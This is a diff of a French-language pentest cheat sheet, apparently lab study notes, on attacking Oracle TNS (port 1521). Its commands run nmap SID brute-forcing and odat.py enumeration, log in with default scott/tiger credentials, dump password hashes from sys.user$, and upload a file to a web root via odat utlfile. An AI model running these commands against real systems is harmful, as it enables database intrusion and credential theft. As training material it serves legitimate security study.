@@ -3,13 +3,16 @@ public: true
 #Tags: tag1, tag2
 ---
 
-Ports : 
+Ports :
+
 - 1521/tcp
 
 ## Enumeration
 
 ### Installation de l'outil d'énumération
+
 -sid-brute
+
 ```
 #!/bin/bash
 
@@ -32,11 +35,13 @@ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
 ```
 
 ### odat.py
+
 ```shell-session
 ./odat.py all -s 10.129.204.235
 ```
 
 ### SQLplus - Log In
+
 ```shell-session
 export ORACLE_HOME=/usr/lib/oracle/19.6/client64
 export LD_LIBRARY_PATH="$ORACLE_HOME/lib"
@@ -58,6 +63,7 @@ SQL> select * from user_role_privs;
 ```
 
 #### Oracle RDBMS - Extract Password Hashes
+
 ```shell-session
 SQL> select name, password from sys.user$;
 
@@ -68,7 +74,9 @@ PUBLIC
 ```
 
 #### Oracle RDBMS - File Upload
+
 Si la vulnérabilité est exploitable et que le serveur héberge un serveur web dont on arrive à trouver le chemin d'accès à la racine, on peut tenter cela :
+
 ```shell-session
 $ echo "Oracle File Upload Test" > testing.txt
 $ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
@@ -78,6 +86,7 @@ $ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile
 ```
 
 Valider l'upload
+
 ```shell-session
 curl -X GET http://10.129.204.235/testing.txt
 ```
